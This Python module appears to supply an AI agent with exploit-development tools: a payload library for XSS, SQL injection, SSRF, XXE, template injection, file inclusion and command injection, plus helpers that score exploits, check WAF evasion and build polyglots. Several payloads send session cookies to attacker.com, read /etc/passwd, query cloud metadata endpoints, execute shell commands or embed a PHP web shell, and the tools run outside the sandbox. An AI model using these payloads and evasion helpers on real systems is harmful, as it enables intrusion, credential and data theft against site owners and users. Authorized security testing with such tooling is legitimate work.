"""
Exploit Runtime - Custom Exploit Development and Validation.

Provides tools for developing, testing, and validating security exploits
in a controlled environment with comprehensive payload generation.
"""

from __future__ import annotations

import re
import uuid
import logging
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Literal

from ..tools.registry import register_tool

logger = logging.getLogger(__name__)

# Payload templates organized by vulnerability type
PAYLOAD_TEMPLATES = {
    "xss": {
        "basic": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
        ],
        "filter_bypass": [
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=\"alert('XSS')\">",
            "<svg/onload=alert('XSS')>",
            "<<script>alert('XSS')//<</script>",
            "<img src=\"x\" onerror=\"alert&#40;'XSS'&#41;\">",
        ],
        "dom": [
            "#<script>alert('XSS')</script>",
            "javascript:/*--></script><script>alert('XSS')//",
            "'-alert('XSS')-'",
        ],
        "stored": [
            "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
            "<img src=x onerror=\"fetch('http://attacker.com/?c='+document.cookie)\">",
        ],
    },
    "sqli": {
        "basic": [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "1' OR '1'='1",
            "admin'--",
        ],
        "union": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT user(),database()--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        ],
        "blind": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND (SELECT SUBSTRING(version(),1,1))='5'--",
            "1' AND SLEEP(5)--",
            "1' AND IF(1=1,SLEEP(5),0)--",
        ],
        "error_based": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
        ],
    },
    "ssrf": {
        "basic": [
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://0.0.0.0",
            "http://169.254.169.254/",
        ],
        "bypass": [
            "http://127.0.0.1:80",
            "http://127.1",
            "http://0177.0.0.1",
            "http://2130706433",
            "http://127.0.0.1.xip.io",
            "http://[0:0:0:0:0:ffff:127.0.0.1]",
        ],
        "cloud": [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
        ],
    },
    "xxe": {
        "basic": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
        ],
        "blind": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>',
        ],
    },
    "ssti": {
        "jinja2": [
            "{{7*7}}",
            "{{config}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ],
        "twig": [
            "{{7*7}}",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        ],
        "freemarker": [
            "${7*7}",
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        ],
    },
    "lfi": {
        "basic": [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd%00",
            "..%252f..%252f..%252fetc/passwd",
        ],
        "wrapper": [
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        ],
    },
    "rce": {
        "linux": [
            "; id",
            "| id",
            "` id `",
            "$(id)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
        ],
        "windows": [
            "& whoami",
            "| whoami",
            "; whoami",
            "` whoami `",
        ],
    },
}


@register_tool(sandbox_execution=False, category="exploit")
def generate_payload(
    agent_state: Any,
    vulnerability_type: str,
    variant: str = "basic",
    custom_data: Optional[str] = None,
    encoding: Optional[str] = None,
) -> Dict[str, Any]:
    """
    Generate payloads for various vulnerability types.
    
    Provides pre-built payloads and templates for common vulnerabilities.
    Use these as starting points and customize for specific targets.
    
    Args:
        agent_state: Current agent state
        vulnerability_type: Type of vulnerability (xss, sqli, ssrf, xxe, ssti, lfi, rce)
        variant: Variant of payloads (basic, filter_bypass, blind, etc.)
        custom_data: Custom data to inject into payloads (e.g., callback URL)
        encoding: Optional encoding to apply (url, base64, html)
    
    Returns:
        Dictionary with generated payloads
    """
    vulnerability_type = vulnerability_type.lower()
    
    if vulnerability_type not in PAYLOAD_TEMPLATES:
        return {
            "success": False,
            "error": f"Unknown vulnerability type: {vulnerability_type}",
            "supported_types": list(PAYLOAD_TEMPLATES.keys()),
        }
    
    type_payloads = PAYLOAD_TEMPLATES[vulnerability_type]
    
    if variant not in type_payloads:
        return {
            "success": False,
            "error": f"Unknown variant '{variant}' for {vulnerability_type}",
            "supported_variants": list(type_payloads.keys()),
        }
    
    payloads = type_payloads[variant].copy()
    
    # Replace placeholders with custom data
    if custom_data:
        payloads = [p.replace("attacker.com", custom_data) for p in payloads]
    
    # Apply encoding if requested
    if encoding:
        import urllib.parse
        import base64
        import html as html_module
        
        encoded_payloads = []
        for payload in payloads:
            if encoding == "url":
                encoded = urllib.parse.quote(payload, safe="")
            elif encoding == "double_url":
                encoded = urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
            elif encoding == "base64":
                encoded = base64.b64encode(payload.encode()).decode()
            elif encoding == "html":
                encoded = html_module.escape(payload)
            else:
                encoded = payload
            encoded_payloads.append(encoded)
        payloads = encoded_payloads
    
    return {
        "success": True,
        "vulnerability_type": vulnerability_type,
        "variant": variant,
        "payload_count": len(payloads),
        "payloads": payloads,
        "encoding": encoding,
        "custom_data": custom_data,
        "note": "These are starting templates. Customize based on target behavior.",
    }


@register_tool(sandbox_execution=False, category="exploit")
def validate_exploit(
    agent_state: Any,
    exploit_code: str,
    exploit_type: str,
    target_info: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    """
    Validate an exploit's structure and potential effectiveness.
    
    Performs static analysis to check for common issues and provides
    recommendations for improvement.
    
    Args:
        agent_state: Current agent state
        exploit_code: The exploit code/payload to validate
        exploit_type: Type of exploit (xss, sqli, ssrf, etc.)
        target_info: Optional target information for context
    
    Returns:
        Dictionary with validation results and recommendations
    """
    exploit_type = exploit_type.lower()
    
    issues = []
    warnings = []
    recommendations = []
    score = 100
    
    # General checks
    if len(exploit_code) < 5:
        issues.append("Exploit code is too short")
        score -= 20
    
    if len(exploit_code) > 10000:
        warnings.append("Exploit code is very long, may be blocked by WAF")
        score -= 5
    
    # Type-specific validation
    if exploit_type == "xss":
        if "<script>" in exploit_code.lower():
            if "</script>" not in exploit_code.lower():
                issues.append("Missing closing </script> tag")
                score -= 15
        
        if "alert" in exploit_code or "confirm" in exploit_code or "prompt" in exploit_code:
            pass  # Good - has verification mechanism
        else:
            warnings.append("No obvious verification mechanism (alert/confirm/prompt)")
            recommendations.append("Add alert() or similar for proof of execution")
        
        # Check for common filter bypass techniques
        if exploit_code == exploit_code.lower():
            recommendations.append("Consider mixed case to bypass simple filters: <ScRiPt>")
        
        if "onerror" in exploit_code.lower() or "onload" in exploit_code.lower():
            pass  # Good - uses event handlers
        elif "<script>" not in exploit_code.lower():
            recommendations.append("Consider event handlers (onerror, onload) as alternative")
    
    elif exploit_type == "sqli":
        if "--" not in exploit_code and "/*" not in exploit_code and "#" not in exploit_code:
            warnings.append("No comment terminator found (-- or /* or #)")
            recommendations.append("Add comment to terminate query: ' OR '1'='1'--")
            score -= 10
        
        if "'" not in exploit_code and '"' not in exploit_code:
            issues.append("No quote character found - may not break out of string context")
            score -= 15
        
        if "UNION" in exploit_code.upper():
            if "SELECT" not in exploit_code.upper():
                issues.append("UNION without SELECT")
                score -= 10
    
    elif exploit_type == "ssrf":
        if "127.0.0.1" in exploit_code or "localhost" in exploit_code:
            pass  # Basic SSRF
        elif "169.254.169.254" in exploit_code:
            pass  # Cloud metadata
        else:
            recommendations.append("Consider targeting localhost (127.0.0.1) or cloud metadata (169.254.169.254)")
        
        if "http://" not in exploit_code and "https://" not in exploit_code:
            warnings.append("No protocol specified")
            recommendations.append("Include protocol: http:// or file://")
    
    elif exploit_type == "xxe":
        if "<!DOCTYPE" not in exploit_code.upper():
            issues.append("Missing DOCTYPE declaration")
            score -= 20
        if "<!ENTITY" not in exploit_code.upper():
            issues.append("Missing ENTITY declaration")
            score -= 20
        if "SYSTEM" not in exploit_code.upper() and "PUBLIC" not in exploit_code.upper():
            warnings.append("No SYSTEM or PUBLIC keyword - may not fetch external content")
    
    elif exploit_type == "ssti":
        template_indicators = ["{{", "}}", "${", "<%", "%>", "<#", "#>"]
        has_template = any(ind in exploit_code for ind in template_indicators)
        if not has_template:
            issues.append("No template syntax detected")
            score -= 20
    
    elif exploit_type == "lfi":
        if "../" not in exploit_code and "..%2f" not in exploit_code.lower():
            warnings.append("No path traversal sequence found")
            recommendations.append("Use ../ for path traversal")
        
        if "/etc/passwd" not in exploit_code and "win.ini" not in exploit_code.lower():
            recommendations.append("Target known files like /etc/passwd (Linux) or C:\\Windows\\win.ini (Windows)")
    
    # Calculate final score
    score = max(0, min(100, score))
    
    # Determine validity level
    if score >= 80:
        validity = "high"
    elif score >= 60:
        validity = "medium"
    elif score >= 40:
        validity = "low"
    else:
        validity = "very_low"
    
    return {
        "success": True,
        "exploit_type": exploit_type,
        "validity_score": score,
        "validity_level": validity,
        "issues": issues,
        "warnings": warnings,
        "recommendations": recommendations,
        "analysis": {
            "length": len(exploit_code),
            "has_encoding": "%" in exploit_code or "&#" in exploit_code,
        },
    }


@register_tool(sandbox_execution=False, category="exploit")
def test_payload(
    agent_state: Any,
    payload: str,
    test_type: Literal["syntax", "encoding", "waf_evasion"] = "syntax",
    context: Optional[str] = None,
) -> Dict[str, Any]:
    """
    Test a payload for various properties without executing it.
    
    Performs dry-run analysis to check payload viability.
    
    Args:
        agent_state: Current agent state
        payload: The payload to test
        test_type: Type of test (syntax, encoding, waf_evasion)
        context: Optional context (html, url, json, etc.)
    
    Returns:
        Dictionary with test results
    """
    results = {
        "payload": payload,
        "test_type": test_type,
        "context": context,
        "tests_passed": [],
        "tests_failed": [],
        "suggestions": [],
    }
    
    if test_type == "syntax":
        # Check for balanced brackets/quotes
        brackets = {"(": ")", "[": "]", "{": "}", "<": ">"}
        quotes = ["'", '"', "`"]
        
        for open_b, close_b in brackets.items():
            if payload.count(open_b) != payload.count(close_b):
                results["tests_failed"].append(f"Unbalanced {open_b}{close_b}")
            else:
                results["tests_passed"].append(f"Balanced {open_b}{close_b}")
        
        for quote in quotes:
            count = payload.count(quote)
            if count % 2 != 0:
                # Could be intentional for injection
                results["suggestions"].append(f"Odd number of {quote} quotes (may be intentional)")
    
    elif test_type == "encoding":
        # Detect encoding schemes
        encodings_detected = []
        
        if re.search(r'%[0-9a-fA-F]{2}', payload):
            encodings_detected.append("URL encoding")
        if re.search(r'&#\d+;|&#x[0-9a-fA-F]+;', payload):
            encodings_detected.append("HTML entities")
        if re.search(r'\\x[0-9a-fA-F]{2}', payload):
            encodings_detected.append("Hex escape")
        if re.search(r'\\u[0-9a-fA-F]{4}', payload):
            encodings_detected.append("Unicode escape")
        
        # Check if base64
        import base64
        try:
            decoded = base64.b64decode(payload)
            if decoded:
                encodings_detected.append("Possible Base64")
        except Exception:
            pass
        
        results["encodings_detected"] = encodings_detected
        results["tests_passed"].append(f"Detected {len(encodings_detected)} encoding schemes")
    
    elif test_type == "waf_evasion":
        # Check for WAF evasion techniques
        evasion_techniques = []
        
        if any(c.isupper() and c.isalpha() for c in payload) and any(c.islower() for c in payload):
            evasion_techniques.append("Mixed case")
        
        if "/*" in payload or "//" in payload:
            evasion_techniques.append("Comments")
        
        if re.search(r'%[0-9a-fA-F]{2}', payload):
            evasion_techniques.append("URL encoding")
        
        if "\t" in payload or "\n" in payload or "  " in payload:
            evasion_techniques.append("Whitespace obfuscation")
        
        if re.search(r'<\s+', payload) or re.search(r'>\s+', payload):
            evasion_techniques.append("Tag padding")
        
        if "char(" in payload.lower() or "concat(" in payload.lower():
            evasion_techniques.append("String functions")
        
        results["evasion_techniques"] = evasion_techniques
        
        if len(evasion_techniques) >= 2:
            results["tests_passed"].append("Multiple evasion techniques detected")
        elif len(evasion_techniques) == 1:
            results["suggestions"].append("Consider adding more evasion techniques")
        else:
            results["tests_failed"].append("No WAF evasion techniques detected")
            results["suggestions"].append("Add encoding, mixed case, or comments for better evasion")
    
    results["success"] = len(results["tests_failed"]) == 0
    
    return results


@register_tool(sandbox_execution=False, category="exploit")
def generate_polyglot(
    agent_state: Any,
    target_types: List[str],
) -> Dict[str, Any]:
    """
    Generate polyglot payloads that work across multiple contexts.
    
    Polyglots are useful when the injection context is unclear.
    
    Args:
        agent_state: Current agent state
        target_types: List of vulnerability types to target
    
    Returns:
        Dictionary with polyglot payloads
    """
    # Pre-built polyglots
    polyglots = {
        ("xss", "sqli"): [
            "'-alert('XSS')-'",
            "'\"--></script><script>alert('XSS')</script>",
            "1' OR '1'='1'--<script>alert('XSS')</script>",
        ],
        ("xss", "ssti"): [
            "{{7*7}}<script>alert('XSS')</script>",
            "${7*7}<img src=x onerror=alert('XSS')>",
        ],
        ("xss", "html"): [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            "<svg/onload=alert('XSS')>",
        ],
    }
    
    # Normalize and sort target types
    target_set = frozenset(t.lower() for t in target_types)
    
    matching_polyglots = []
    for key, payloads in polyglots.items():
        if target_set.issubset(set(key)) or set(key).issubset(target_set):
            matching_polyglots.extend(payloads)
    
    # Universal polyglot
    universal = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "'\"><img src=x onerror=alert(1)>{{7*7}}${7*7}<%=7*7%>",
    ]
    
    return {
        "success": True,
        "target_types": list(target_types),
        "polyglot_count": len(matching_polyglots) + len(universal),
        "specific_polyglots": matching_polyglots,
        "universal_polyglots": universal,
        "usage_note": "Test these in order; universal polyglots work in more contexts but may be longer",
    }


@register_tool(sandbox_execution=False, category="exploit")
def create_exploit_template(
    agent_state: Any,
    vulnerability_type: str,
    target_url: str,
    parameters: Optional[Dict[str, str]] = None,
    method: str = "GET",
) -> Dict[str, Any]:
    """
    Create a structured exploit template for documentation and testing.
    
    Generates a reusable exploit template with proper structure.
    
    Args:
        agent_state: Current agent state
        vulnerability_type: Type of vulnerability
        target_url: Target URL
        parameters: Request parameters
        method: HTTP method
    
    Returns:
        Dictionary with exploit template
    """
    exploit_id = f"exploit_{uuid.uuid4().hex[:8]}"
    
    template = {
        "id": exploit_id,
        "vulnerability_type": vulnerability_type,
        "created_at": datetime.now(timezone.utc).isoformat(),
        "target": {
            "url": target_url,
            "method": method.upper(),
            "parameters": parameters or {},
        },
        "payload": {
            "raw": "",
            "encoded": "",
            "notes": "",
        },
        "reproduction_steps": [
            f"1. Navigate to {target_url}",
            "2. Inject payload into vulnerable parameter",
            "3. Observe the response",
            "4. Confirm vulnerability with proof",
        ],
        "expected_result": "",
        "actual_result": "",
        "severity_estimate": "medium",
        "impact": "",
        "remediation": "",
        "references": [],
        "status": "template",
    }
    
    # Add type-specific defaults
    if vulnerability_type == "xss":
        template["payload"]["raw"] = "<script>alert(document.domain)</script>"
        template["expected_result"] = "JavaScript alert showing the domain"
        template["remediation"] = "Implement proper output encoding and Content-Security-Policy"
    elif vulnerability_type == "sqli":
        template["payload"]["raw"] = "' OR '1'='1'--"
        template["expected_result"] = "Authentication bypass or data leakage"
        template["remediation"] = "Use parameterized queries and input validation"
    elif vulnerability_type == "ssrf":
        template["payload"]["raw"] = "http://127.0.0.1:22"
        template["expected_result"] = "Access to internal services or metadata"
        template["remediation"] = "Implement URL allowlisting and disable unnecessary protocols"
    
    return {
        "success": True,
        "exploit_id": exploit_id,
        "template": template,
        "usage": "Fill in the template fields and use nekodb_save() to store the exploit",
    }
